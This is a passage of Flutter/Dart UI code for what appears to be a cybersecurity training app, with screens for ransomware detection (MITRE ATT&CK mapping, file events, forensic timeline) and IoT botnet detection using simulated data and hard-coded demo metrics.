            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: _MetricCard(
              label: 'Isolation',
              value: _isolated ? 'DONE' : 'READY',
              color: _isolated ? AppTheme.accentOrange : AppTheme.accentGreen,
              icon: Icons.block,
              subtitle: 'Endpoint',
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildOverviewTab() {
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        const SizedBox(height: 8),
        _buildMitreCard(),
        const SizedBox(height: 8),
        _SectionHeader(
          title: 'Step-by-Step Guidance',
          subtitle: 'Follow these steps to complete Project 1',
          icon: Icons.list_alt,
          color: const Color(0xFFFF3B3B),
        ),
        _StepCard(
          step: 1,
          title: 'Initialize File System Monitor',
          description: 'Deploy behavioral sensor to watch inotify events, track file entropy, detect extension changes',
          color: const Color(0xFFFF3B3B),
          isCompleted: _activeStep > 1,
          isActive: _activeStep == 1,
        ),
        _StepCard(
          step: 2,
          title: 'Network Traffic Analysis',
          description: 'Capture flows via libpcap, apply C2 signatures (beacon intervals, domain generation algorithms)',
          color: const Color(0xFFFF3B3B),
          isCompleted: _activeStep > 2,
          isActive: _activeStep == 2,
        ),
        _StepCard(
          step: 3,
          title: 'Ransomware Detection Engine',
          description: 'ML classifier on file I/O patterns + entropy analysis. Threshold: >100 encrypted files/min',
          color: const Color(0xFFFF3B3B),
          isCompleted: _activeStep > 3,
          isActive: _activeStep == 3,
        ),
        _StepCard(
          step: 4,
          title: 'Automated Isolation & Response',
          description: 'Kill malicious process, block C2 IPs via iptables, quarantine endpoint, alert SOC team',
          color: const Color(0xFFFF3B3B),
          isCompleted: _activeStep > 4,
          isActive: _activeStep == 4,
        ),
        const SizedBox(height: 8),
        _TerminalLog(entries: _logs, height: 200),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildMitreCard() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFFFF3B3B).withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.map, color: Color(0xFFFF3B3B), size: 16),
              const SizedBox(width: 8),
              const Text(
                'MITRE ATT&CK Mapping',
                style: TextStyle(
                  color: AppTheme.textPrimary,
                  fontWeight: FontWeight.bold,
                  fontSize: 13,
                ),
              ),
            ],
          ),
          const SizedBox(height: 10),
          _mitreRow('T1566.001', 'Spearphishing Attachment', 'Initial Access'),
          _mitreRow('T1059.001', 'PowerShell Execution', 'Execution'),
          _mitreRow('T1562.001', 'Disable Security Tools', 'Defense Evasion'),
          _mitreRow('T1003.001', 'LSASS Memory Dump', 'Credential Access'),
          _mitreRow('T1021.002', 'SMB Lateral Movement', 'Lateral Movement'),
          _mitreRow('T1486', 'Data Encrypted for Impact', 'Impact'),
        ],
      ),
    );
  }

  Widget _mitreRow(String id, String name, String tactic) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        children: [
          Container(
            width: 80,
            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
            decoration: BoxDecoration(
              color: const Color(0xFFFF3B3B).withValues(alpha: 0.15),
              borderRadius: BorderRadius.circular(4),
            ),
            child: Text(
              id,
              style: const TextStyle(
                color: Color(0xFFFF3B3B),
                fontSize: 9,
                fontFamily: 'monospace',
              ),
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              name,
              style: const TextStyle(color: AppTheme.textPrimary, fontSize: 11),
            ),
          ),
          Text(
            tactic,
            style: const TextStyle(color: AppTheme.textSecondary, fontSize: 9),
          ),
        ],
      ),
    );
  }

  Widget _buildFileEventsTab() {
    final events = TestDataGenerator.generateFileEvents();
    final suspicious = events.where((e) => e['isSuspicious'] == true).length;
    return ListView(
      padding: const EdgeInsets.all(0),
      children: [
        Padding(
          padding: const EdgeInsets.all(12),
          child: Row(
            children: [
              _InfoChip(
                  label: '${events.length} total events',
                  color: AppTheme.accent),
              const SizedBox(width: 8),
              _InfoChip(
                  label: '$suspicious suspicious',
                  color: AppTheme.accentRed,
                  icon: Icons.warning),
            ],
          ),
        ),
        ...events.map((e) => _buildFileEventCard(e)),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildFileEventCard(Map<String, dynamic> e) {
    final isSusp = e['isSuspicious'] == true;
    final isRansom = e['isRansomNote'] == true;
    final color = isRansom
        ? Colors.purple
        : isSusp
            ? AppTheme.accentRed
            : AppTheme.accentGreen;
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: color.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(
                isRansom
                    ? Icons.description
                    : isSusp
                        ? Icons.lock
                        : Icons.insert_drive_file,
                color: color,
                size: 14,
              ),
              const SizedBox(width: 6),
              Expanded(
                child: Text(
                  e['operation'] as String,
                  style: TextStyle(
                    color: color,
                    fontSize: 11,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
              if (isSusp) _buildSeverityBadge('HIGH'),
            ],
          ),
          const SizedBox(height: 6),
          Text(
            (e['path'] as String).split('/').last,
            style: const TextStyle(color: AppTheme.textPrimary, fontSize: 11),
            overflow: TextOverflow.ellipsis,
          ),
          Text(
            e['path'] as String,
            style: const TextStyle(color: AppTheme.textSecondary, fontSize: 9),
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 4),
          Row(
            children: [
              Text(
                'PID: ${e['pid']}  Process: ${e['process']}',
                style: const TextStyle(color: AppTheme.textSecondary, fontSize: 9),
              ),
              if (e['entropyScore'] != null) ...[
                const Spacer(),
                Text(
                  'Entropy: ${(e['entropyScore'] as double).toStringAsFixed(1)}',
                  style: TextStyle(
                    color: (e['entropyScore'] as double) > 7.0
                        ? AppTheme.accentRed
                        : AppTheme.accentGreen,
                    fontSize: 9,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ],
          ),
          if (isRansom)
            Padding(
              padding: const EdgeInsets.only(top: 6),
              child: Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.black,
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  e['content'] as String,
                  style: const TextStyle(
                    color: Colors.red,
                    fontSize: 9,
                    fontFamily: 'monospace',
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildNetworkTab() {
    final traffic = TestDataGenerator.generateNetworkTraffic();
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        Padding(
          padding: const EdgeInsets.all(12),
          child: Wrap(
            spacing: 8,
            children: [
              _InfoChip(label: '${traffic.length} connections', color: AppTheme.accent),
              _InfoChip(
                  label: '${traffic.where((t) => t['isSuspicious'] == true).length} threats',
                  color: AppTheme.accentRed,
                  icon: Icons.warning),
            ],
          ),
        ),
        ...traffic.map((t) => _buildNetworkCard(t)),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildNetworkCard(Map<String, dynamic> t) {
    final isSusp = t['isSuspicious'] == true;
    final color = isSusp ? AppTheme.accentRed : AppTheme.accentGreen;
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: color.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: color.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.network_check, color: color, size: 14),
              const SizedBox(width: 6),
              Text(
                t['protocol'] as String,
                style: TextStyle(
                  color: color,
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const Spacer(),
              if (isSusp)
                _InfoChip(label: t['threatType'] as String, color: AppTheme.accentRed),
            ],
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      '${t['srcIp']}:${t['srcPort']}',
                      style: const TextStyle(color: AppTheme.textPrimary, fontSize: 11),
                    ),
                    const Text('↓ Source', style: TextStyle(color: AppTheme.textSecondary, fontSize: 9)),
                  ],
                ),
              ),
              const Icon(Icons.arrow_forward, color: AppTheme.textSecondary, size: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.end,
                  children: [
                    Text(
                      '${t['dstIp']}:${t['dstPort']}',
                      style: TextStyle(
                        color: isSusp ? AppTheme.accentRed : AppTheme.textPrimary,
                        fontSize: 11,
                      ),
                    ),
                    const Text('Destination ↑', style: TextStyle(color: AppTheme.textSecondary, fontSize: 9)),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 6),
          Text(
            '${t['geoIp']} • ${t['bytesOut']} bytes out • Confidence: ${isSusp ? '${((t['confidence'] as double) * 100).toStringAsFixed(0)}%' : 'N/A'}',
            style: const TextStyle(color: AppTheme.textSecondary, fontSize: 9),
          ),
          if (isSusp)
            Padding(
              padding: const EdgeInsets.only(top: 4),
              child: Text(
                t['details'] as String,
                style: TextStyle(color: AppTheme.accentOrange, fontSize: 10),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildForensicsTab() {
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        const Padding(
          padding: EdgeInsets.all(12),
          child: Text(
            'Attack Timeline Reconstruction',
            style: TextStyle(
              color: AppTheme.textPrimary,
              fontWeight: FontWeight.bold,
              fontSize: 14,
            ),
          ),
        ),
        ..._forensicTimeline.asMap().entries.map((entry) {
          final i = entry.key;
          final e = entry.value;
          return _buildTimelineCard(e, i == _forensicTimeline.length - 1);
        }),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _buildTimelineCard(Map<String, dynamic> e, bool isLast) {
    return IntrinsicHeight(
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const SizedBox(width: 16),
          Column(
            children: [
              Container(
                width: 12,
                height: 12,
                margin: const EdgeInsets.only(top: 16),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: e['color'] as Color,
                  boxShadow: [
                    BoxShadow(
                      color: (e['color'] as Color).withValues(alpha: 0.4),
                      blurRadius: 4,
                    ),
                  ],
                ),
              ),
              if (!isLast)
                Expanded(
                  child: Container(width: 2, color: AppTheme.border),
                ),
            ],
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Container(
              margin: const EdgeInsets.fromLTRB(0, 8, 16, 8),
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: AppTheme.card,
                borderRadius: BorderRadius.circular(8),
                border: Border.all(
                  color: (e['color'] as Color).withValues(alpha: 0.3),
                ),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      _InfoChip(label: e['phase'] as String, color: e['color'] as Color),
                      const SizedBox(width: 6),
                      _InfoChip(label: e['mitre'] as String, color: AppTheme.accent),
                    ],
                  ),
                  const SizedBox(height: 6),
                  Text(
                    e['event'] as String,
                    style: const TextStyle(color: AppTheme.textPrimary, fontSize: 12, fontWeight: FontWeight.w500),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    '${e['time']} • ${e['host']} (${e['ip']})',
                    style: const TextStyle(color: AppTheme.textSecondary, fontSize: 9),
                  ),
                  const SizedBox(height: 4),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                    decoration: BoxDecoration(
                      color: Colors.black,
                      borderRadius: BorderRadius.circular(4),
                    ),
                    child: Text(
                      e['artifact'] as String,
                      style: const TextStyle(
                        color: AppTheme.accentGreen,
                        fontSize: 9,
                        fontFamily: 'monospace',
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ============================================================
// PROJECT 2: IoT BOTNET DETECTION
// ============================================================
class Project2Screen extends StatefulWidget {
  const Project2Screen({super.key});

  @override
  State<Project2Screen> createState() => _Project2ScreenState();
}

class _Project2ScreenState extends State<Project2Screen>
    with SingleTickerProviderStateMixin {
  late TabController _tabs;
  List<Map<String, dynamic>> _devices = [];
  bool _isAnalyzing = false;
  int _activeStep = 0;
  final List<LogEntry> _logs = [];
  late Timer? _analysisTimer;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 3, vsync: this);
    _devices = List<Map<String, dynamic>>.from(
        TestDataGenerator.generateIoTDevices());
    _addLog('INFO', 'IoT NIDS initialized', AppTheme.accentGreen);
    _addLog('INFO', 'Monitoring ${_devices.length} devices', AppTheme.accentGreen);
    _addLog('INFO', 'ML Isolation Forest model: LOADED', AppTheme.accentGreen);
  }

  @override
  void dispose() {
    _tabs.dispose();
    _analysisTimer?.cancel();
    super.dispose();
  }

  void _addLog(String level, String msg, Color color) {
    setState(() {
      _logs.add(LogEntry(
        timestamp: DateTime.now().toString().substring(11, 19),
        level: level,
        message: msg,
        color: color,
      ));
    });
  }

  void _runAnalysis() {
    if (_isAnalyzing) return;
    setState(() {
      _isAnalyzing = true;
      _activeStep = 1;
    });

    final steps = [
      () {
        _addLog('SCAN', 'Fingerprinting IoT devices...', AppTheme.accent);
        _addLog('INFO', 'MAC vendor lookup active', AppTheme.accentGreen);
        setState(() => _activeStep = 2);
      },
      () {
        _addLog('ML', 'Running Isolation Forest on traffic features...', AppTheme.accentPurple);
        _addLog('ML', 'Feature extraction: bandwidth, port, protocol, timing', AppTheme.accentPurple);
      },
      () {
        for (final d in _devices) {
          if (d['status'] == 'compromised' || d['status'] == 'suspicious') {
            _addLog('ALERT', '${d['name']}: anomaly score ${d['mlAnomalyScore']}', AppTheme.accentRed);
          }
        }
        setState(() => _activeStep = 3);
      },
      () {
        _addLog('INFO', 'Analysis complete. 2 compromised, 1 suspicious devices', AppTheme.accentOrange);
        setState(() {
          _isAnalyzing = false;
          _activeStep = 4;
        });
      },
    ];

    int i = 0;
    _analysisTimer = Timer.periodic(const Duration(seconds: 2), (t) {
      if (i < steps.length) {
        steps[i]();
        i++;
      } else {
        t.cancel();
      }
    });
  }

  void _toggleBlock(String deviceId) {
    setState(() {
      final idx = _devices.indexWhere((d) => d['id'] == deviceId);
      if (idx != -1) {
        _devices[idx] = Map<String, dynamic>.from(_devices[idx]);
        _devices[idx]['isBlocked'] = !(_devices[idx]['isBlocked'] as bool);
        _addLog(
          'ACTION',
          '${_devices[idx]['isBlocked'] ? 'BLOCKED' : 'UNBLOCKED'}: ${_devices[idx]['name']}',
          _devices[idx]['isBlocked'] == true ? AppTheme.accentRed : AppTheme.accentGreen,
        );
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final compromised = _devices.where((d) => d['status'] == 'compromised').length;
    final suspicious = _devices.where((d) => d['status'] == 'suspicious').length;
    final blocked = _devices.where((d) => d['isBlocked'] == true).length;

    return Scaffold(
      backgroundColor: AppTheme.primary,
      appBar: _buildAppBar(context, 'Project 2: IoT Botnet Detection',
          'Smart Home Network Analysis', AppTheme.accent),
      body: Column(
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Row(
              children: [
                Expanded(
                  child: _MetricCard(
                    label: 'Compromised',
                    value: '$compromised',
                    color: AppTheme.accentRed,
                    icon: Icons.bug_report,
                    subtitle: 'Devices',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Suspicious',
                    value: '$suspicious',
                    color: AppTheme.accentOrange,
                    icon: Icons.warning,
                    subtitle: 'Devices',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: _MetricCard(
                    label: 'Blocked',
                    value: '$blocked',
                    color: AppTheme.accent,
                    icon: Icons.block,
                    subtitle: 'Quarantined',
                  ),
                ),
              ],
            ),
          ),
          TabBar(
            controller: _tabs,
            indicatorColor: AppTheme.accent,
            labelColor: AppTheme.accent,
            unselectedLabelColor: AppTheme.textSecondary,
            labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold),
            tabs: const [
              Tab(text: 'DEVICES'),
              Tab(text: 'ML ANALYSIS'),
              Tab(text: 'GUIDE'),
            ],
          ),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _buildDevicesTab(),
                _buildMLTab(),
                _buildGuideTab(),
              ],
            ),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton.extended(
        onPressed: _isAnalyzing ? null : _runAnalysis,
        backgroundColor: _isAnalyzing ? AppTheme.border : AppTheme.accent,
        icon: _isAnalyzing
            ? const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(strokeWidth: 2),
              )
            : const Icon(Icons.search, color: Colors.black),
        label: Text(
          _isAnalyzing ? 'ANALYZING...' : 'ANALYZE',
          style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold),
        ),
      ),
    );
  }

  Widget _buildDevicesTab() {
    return ListView(
      padding: const EdgeInsets.all(12),
      children: [
        ..._devices.map((d) => _buildDeviceCard(d)),
        const SizedBox(height: 80),
      ],
    );
  }

  Color _statusColor(String status) {
    switch (status) {
      case 'compromised':
        return AppTheme.accentRed;
      case 'suspicious':
        return AppTheme.accentOrange;
      default:
        return AppTheme.accentGreen;
    }
  }

  Widget _buildDeviceCard(Map<String, dynamic> d) {
    final status = d['status'] as String;
    final color = _statusColor(status);
    final isBlocked = d['isBlocked'] as bool;

    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: AppTheme.card,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: isBlocked
              ? AppTheme.textSecondary.withValues(alpha: 0.3)
              : color.withValues(alpha: 0.4),
        ),
        boxShadow: [
          if (status == 'compromised')
            BoxShadow(
              color: color.withValues(alpha: 0.15),
              blurRadius: 8,
            ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: color.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(
                  _deviceIcon(d['type'] as String),
                  color: isBlocked ? AppTheme.textSecondary : color,
                  size: 20,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Text(
                          d['name'] as String,
                          style: TextStyle(
                            color: isBlocked
                                ? AppTheme.textSecondary
                                : AppTheme.textPrimary,
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                            decoration: isBlocked
                                ? TextDecoration.lineThrough
                                : null,
                          ),
                        ),
                        const SizedBox(width: 6),
                        if (isBlocked)
                          const _InfoChip(
                              label: 'BLOCKED',
                              color: AppTheme.textSecondary),
                      ],
                    ),
                    Text(
                      '${d['manufacturer']} • ${d['ip']}',
                      style: const TextStyle(
                          color: AppTheme.textSecondary, fontSize: 10),
                    ),
                  ],
                ),
              ),
              _InfoChip(label: status.toUpperCase(), color: color),
            ],
          ),
          const SizedBox(height: 10),
          _bandwidthBar(
            d['normalBandwidth'] as double,
            d['currentBandwidth'] as double,
            d['bandwidthUnit'] as String,
          ),
          const SizedBox(height: 8),
          _anomalyScoreBar(d['mlAnomalyScore'] as double),
          if ((d['vulnerabilities'] as List).isNotEmpty) ...[
            const SizedBox(height: 8),
            const Text(
              'Vulnerabilities:',
              style: TextStyle(
                  color: AppTheme.textSecondary,
                  fontSize: 10,
                  fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 4),
            Wrap(
              spacing: 4,
              runSpacing: 4,
              children: (d['vulnerabilities'] as List<String>)
                  .map((v) => _InfoChip(
                      label: v,
                      color: AppTheme.accentOrange,
                      icon: Icons.bug_report))
                  .toList(),
            ),
          ],
          if (d['c2Server'] != null) ...[
            const SizedBox(height: 6),
            Row(
              children: [
                const Icon(Icons.cell_tower, color: AppTheme.accentRed, size: 12),
                const SizedBox(width: 4),
                Text(
                  'C2: ${d['c2Server']}',
                  style: const TextStyle(
                      color: AppTheme.accentRed,
                      fontSize: 10,
                      fontFamily: 'monospace'),
                ),
              ],
            ),
          ],
          const SizedBox(height: 10),
          Row(
            children: [
              Expanded(
                child: ElevatedButton.icon(
                  onPressed: () => _toggleBlock(d['id'] as String),
                  icon: Icon(
                    isBlocked ? Icons.lock_open : Icons.block,
                    size: 14,
                  ),
                  label: Text(
                    isBlocked ? 'UNBLOCK' : 'BLOCK DEVICE',
                    style: const TextStyle(fontSize: 11),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: isBlocked
                        ? AppTheme.accentGreen.withValues(alpha: 0.2)
                        : AppTheme.accentRed.withValues(alpha: 0.2),
                    foregroundColor:
                        isBlocked ? AppTheme.accentGreen : AppTheme.accentRed,
                    padding: const EdgeInsets.symmetric(vertical: 8),
                  ),
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: OutlinedButton.icon(
                  onPressed: () => _showDeviceDetails(d),
                  icon: const Icon(Icons.info_outline, size: 14),
                  label: const Text('DETAILS', style: TextStyle(fontSize: 11)),
                  style: OutlinedButton.styleFrom(
                    foregroundColor: AppTheme.accent,
                    side: BorderSide(color: AppTheme.accent.withValues(alpha: 0.3)),
                    padding: const EdgeInsets.symmetric(vertical: 8),
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  void _showDeviceDetails(Map<String, dynamic> d) {
    showModalBottomSheet(
      context: context,
      backgroundColor: AppTheme.surface,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
      ),
      builder: (_) => Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              d['name'] as String,
              style: const TextStyle(
                color: AppTheme.textPrimary,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 16),
            _detailRow('MAC Address', d['mac'] as String),
            _detailRow('IP Address', d['ip'] as String),
            _detailRow('Firmware', '${d['firmware']} (latest: ${d['latestFirmware']})'),
            _detailRow('Open Ports', (d['openPorts'] as List).join(', ')),
            _detailRow('Traffic Pattern', d['trafficPattern'] as String),
            _detailRow('Botnet Role', d['botnetRole'] ?? 'None'),
            _detailRow('Attack Volume', '${d['attackVolumeGbps']} Gbps'),
            _detailRow('ML Anomaly Score', '${d['mlAnomalyScore']}'),
          ],
        ),
      ),
    );
  }

  Widget _detailRow(String k, String v) => Padding(
        padding: const EdgeInsets.symmetric(vertical: 4),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            SizedBox(
              width: 130,
              child: Text(
                k,
                style: const TextStyle(
                    color: AppTheme.textSecondary, fontSize: 11),
              ),
            ),
            Expanded(
              child: Text(
                v,
                style: const TextStyle(
                    color: AppTheme.textPrimary,
                    fontSize: 11,
                    fontFamily: 'monospace'),
              ),
            ),
          ],
        ),
      );

  IconData _deviceIcon(String type) {
    switch (type) {
      case 'IP Camera':
        return Icons.videocam;
      case 'Thermostat':
        return Icons.thermostat;
      case 'Smart Lock':
        return Icons.lock;
      case 'Smart TV':
        return Icons.tv;
      default:
        return Icons.device_hub;
    }
  }

  Widget _bandwidthBar(double normal, double current, String unit) {
    final ratio = (current / (normal * 10)).clamp(0.0, 1.0);
    final isAnomaly = current > normal * 2;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            const Text('Bandwidth', style: TextStyle(color: AppTheme.textSecondary, fontSize: 9)),
            Text(
              '$current $unit (normal: $normal)',
              style: TextStyle(
                color: isAnomaly ? AppTheme.accentRed : AppTheme.accentGreen,
                fontSize: 9,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        const SizedBox(height: 3),
        ClipRRect(
          borderRadius: BorderRadius.circular(4),
          child: LinearProgressIndicator(
            value: ratio,
            backgroundColor: AppTheme.border,
            valueColor: AlwaysStoppedAnimation(
              isAnomaly ? AppTheme.accentRed : AppTheme.accentGreen,
            ),
            minHeight: 6,
          ),
        ),
      ],
    );
  }

  Widget _anomalyScoreBar(double score) {
    final color = score > 0.8
        ? AppTheme.accentRed
        : score > 0.5
            ? AppTheme.accentOrange
            : AppTheme.accentGreen;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            const Text('ML Anomaly Score', style: TextStyle(color: AppTheme.textSecondary, fontSize: 9)),
            Text(
              score.toStringAsFixed(2),
              style: TextStyle(color: color, fontSize: 9, fontWeight: FontWeight.bold),
            ),
          ],
        ),
        const SizedBox(height: 3),
        ClipRRect(
          borderRadius: BorderRadius.circular(4),
          child: LinearProgressIndicator(
            value: score,
            backgroundColor: AppTheme.border,
            valueColor: AlwaysStoppedAnimation(color),
            minHeight: 6,
          ),
        ),
      ],
    );
  }

  Widget _buildMLTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: AppTheme.card,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppTheme.accentPurple.withValues(alpha: 0.3)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  const Icon(Icons.psychology, color: AppTheme.accentPurple, size: 18),
                  const SizedBox(width: 8),
                  const Text(
                    'Isolation Forest Model',
                    style: TextStyle(
                      color: AppTheme.textPrimary,
                      fontWeight: FontWeight.bold,
                      fontSize: 14,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 12),
              _mlMetricRow('Detection Rate', '94.2%', AppTheme.accentGreen),
              _mlMetricRow('False Positive Rate', '3.8%', AppTheme.accentGreen),
              _mlMetricRow('Detection Latency', '< 5 seconds', AppTheme.accentGreen),
              _mlMetricRow('Training Samples', '128,000 flows', AppTheme.accent),
              _mlMetricRow('Features Used', '12 network flow features', AppTheme.accent),
              _mlMetricRow('Contamination Rate', '0.05 (5% outliers)', AppTheme.accentOrange),
            ],
          ),
        ),
        const SizedBox(height: 16),
        Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: AppTheme.card,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppTheme.accent.withValues(alpha: 0.3)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text(
                'Feature Importance',
                style: TextStyle(
                  color: AppTheme.textPrimary,
                  fontWeight: FontWeight.bold,
                  fontSize: 13,
                ),
              ),
              const SizedBox(height: 12),
              _featureBar('Bandwidth Ratio', 0.89),
              _featureBar('Packet Inter-arrival Time', 0.76),
              _featureBar('Port Usage Pattern', 0.71),
              _featureBar('Destination IP Diversity', 0.68),
              _featureBar('Protocol Distribution', 0.62),
              _featureBar('TCP Flags Distribution', 0.58),
            ],
          ),
        ),
        const SizedBox(height: 16),
        _TerminalLog(entries: _logs),
        const SizedBox(height: 80),
      ],
    );
  }

  Widget _mlMetricRow(String k, String v, Color color) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(k, style: const TextStyle(color: AppTheme.textSecondary, fontSize: 11)),
          Text(v, style: TextStyle(color: color, fontSize: 11, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  Widget _featureBar(String name, double importance) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(name, style: const TextStyle(color: AppTheme.textSecondary, fontSize: 10)),
              Text(
                '${(importance * 100).toStringAsFixed(0)}%',
                style: const TextStyle(color: AppTheme.accent, fontSize: 10),
              ),
            ],
          ),
          const SizedBox(height: 3),
          ClipRRect(
            borderRadius: BorderRadius.circular(4),
            child: LinearProgressIndicator(
              value: importance,
              backgroundColor: AppTheme.border,
              valueColor: const AlwaysStoppedAnimation(AppTheme.accentPurple),
              minHeight: 5,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildGuideTab() {
    return ListView(
      padding: EdgeInsets.zero,
      children: [
        const SizedBox(height: 8),
        _StepCard(
          step: 1,
          title: 'Deploy Network Sensor',
          description: 'Install packet capture agent on router/switch. Capture NetFlow v9 data from all IoT subnets.',
          color: AppTheme.accent,
          isCompleted: _activeStep > 1,
          isActive: _activeStep == 1,
        ),
        _StepCard(
          step: 2,
          title: 'IoT Device Fingerprinting',
          description: 'Use MAC OUI lookup, HTTP user-agent strings, mDNS, and DHCP options to identify device types.',
          color: AppTheme.accent,
          isCompleted: _activeStep > 2,
          isActive: _activeStep == 2,
        ),
        _StepCard(
          step: 3,
          title: 'Anomaly Detection (ML)',
          description: 'Train Isolation Forest on 7-day baseline. Features: bandwidth, ports, timing, destination IPs.',
          color: AppTheme.accent,
          isCompleted: _activeStep > 3,
          isActive: _activeStep == 3,
        ),
        _StepCard(
          step: 4,
          title: 'Mitigation Dashboard',
          description: 'Block suspicious devices via VLAN assignment. Push firmware updates via TFTP. Alert owner.',
          color: AppTheme.accent,
          isCompleted: _activeStep > 4,
          isActive: _activeStep == 4,
        ),
        const SizedBox(height: 80),
      ],
    );
  }
}

// ============================================================
// PROJECT 3: SUPPLY CHAIN ATTACK
// ============================================================
class Project3Screen extends StatefulWidget {
